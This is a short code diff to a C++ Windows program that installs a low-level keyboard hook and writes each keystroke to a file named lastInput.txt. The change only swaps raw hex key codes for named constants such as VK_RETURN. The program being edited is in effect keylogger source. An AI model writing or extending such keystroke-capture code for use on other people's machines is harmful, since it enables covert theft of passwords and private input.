@@ -6,6 +6,7 @@
 #include <tchar.h>
 #include <windows.h>
 #include <conio.h>
+#include <winuser.h>
 
 std::FILE *fp = std::fopen("lastInput.txt", "w");
 
@@ -32,23 +33,23 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         {
             fprintf(fp, "Keys %c pressed\n", ks->vkCode - 0x41 + 'A');
         }
-        else if (ks->vkCode == 0x0D)
+        else if (ks->vkCode == VK_RETURN)
         {
             fprintf(fp, "Keys ENTER pressed\n");
         }
-        else if (ks->vkCode == 0x10)
+        else if (ks->vkCode == VK_SHIFT)
         {
             fprintf(fp, "Keys SHIFT pressed\n");
         }
-        else if (ks->vkCode == 0x14)
+        else if (ks->vkCode == VK_CAPITAL)
         {
             fprintf(fp, "Keys CAPS LOCK pressed\n");
         }
-        else if (ks->vkCode == 0x25)
+        else if (ks->vkCode == VK_LEFT)
         {
             fprintf(fp, "Keys LEFT ARROW pressed\n");
         }
-        else if (ks->vkCode == 0x27)
+        else if (ks->vkCode == VK_RIGHT)
         {
             fprintf(fp, "Keys RIGHT ARROW pressed\n");
         }
